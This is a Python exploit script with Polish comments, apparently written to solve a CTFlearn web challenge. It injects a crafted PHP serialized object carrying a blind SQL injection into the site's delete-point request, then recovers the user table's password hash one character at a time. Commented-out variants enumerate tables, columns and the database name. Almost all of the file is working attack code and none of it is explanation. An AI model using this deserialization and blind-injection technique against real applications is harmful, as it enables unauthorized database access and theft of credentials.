import requests
import string

#0c2c99a4ad05d39177c30b30531b119b

login = ""
password = ""
phpsessid = ""

alfabet = string.ascii_letters+" _"
alfabetcyfry = string.ascii_letters+string.digits+" _"
alfabethash = "$" + string.hexdigits + string.ascii_letters

adres = "https://web.ctflearn.com/grid/"
strona_logowanie = "login.php"
strona_rejestracja = "register.php"
strona_index = "index.php?"
logowanie = 'controller.php?action=login'
delete = 'controller.php?action=delete_point&'
add = 'controller.php?action=add_point'


post_login = {'uname': login, 'pass': password}
point_xy = {'x': 1, 'y': 1}
session_cookie = {'PHPSESSID': phpsessid}

def add_point():
	post_r = requests.post(adres+add, data=point_xy, cookies=session_cookie)
	return post_r
	
def delete_point(point):
	#print(adres+delete+point)
	post_r = requests.post(adres+delete+point, cookies=session_cookie)
	return post_r
	
def point_exist():
	post_r = requests.post(adres+strona_index, cookies=session_cookie)
	tekst = post_r.text
	if tekst.find("ID:") >= 0:
		return True
	else:
		return False

def znajdztabele():
	print("zntab")
	i = 1
	n=128
	wynik = ""
	pznak=""
	while(i<n):
		print("while"+str(i))
		add_point()
		for znak in alfabethash:
			#print("for"+znak)
			if(point_exist()):
				point = 'point=O:5:"point":3:{s:1:"x";s:1:"1";s:1:"y";s:1:"1";s:2:"ID";s:@length@:"@query@";}'
				#tabele
				#query = '1 or \'' + znak + '\'=(select substring(TABLE_NAME,'+ str(i) +',1) from information_schema.tables where table_schema=database() limit 1 offset 1)'
				#query = '1 or \'' + znak + '\'=(select substring(COLUMN_NAME,'+ str(i) +',1) from information_schema.columns where TABLE_NAME=\'user\' limit 1 offset 1)'
				query = '1 or \'' + znak + '\'=(select substring(password,'+ str(i) +',1) from user limit 1)'
				#query = '1 or 1=select substring(database(),'+ str(i) +',1) = \'' + znak + '\''
				#query = '1 or \''+znak+'\'=(select substring(database(),'+ str(i) +',1))'
				lenght = len(query)
				point = point.replace('@length@',str(lenght))
				point = point.replace('@query@',query)
				delete_point(point)
				pznak=znak
			else:
				wynik = wynik + pznak
				print(pznak)
				print(wynik)
				break
		i=i+1
	return wynik
	
#get_r = requests.get(adres+strona_logowanie)
#point_xy = {'x': 1, 'y': 1}
#session_cookie = {'PHPSESSID': 'ugn6r2djpkrh9ch6a67pu0gm17'}
#post_r = requests.post(adres+add, data=point_xy, cookies=session_cookie)

#post_add = requests.post(adres+add, data={'x': 1, 'y': 1})
#r = requests.get(adres+logowanie)
#html_text: str = r.text  # całość kodu HTML strony
#json_text: dict = r.json()  # jeżeli wykonujemy request do API zwracającego JSON możemy wczytać to do pythonowego słownika w 
print("start")
print(znajdztabele())
#print(dict)
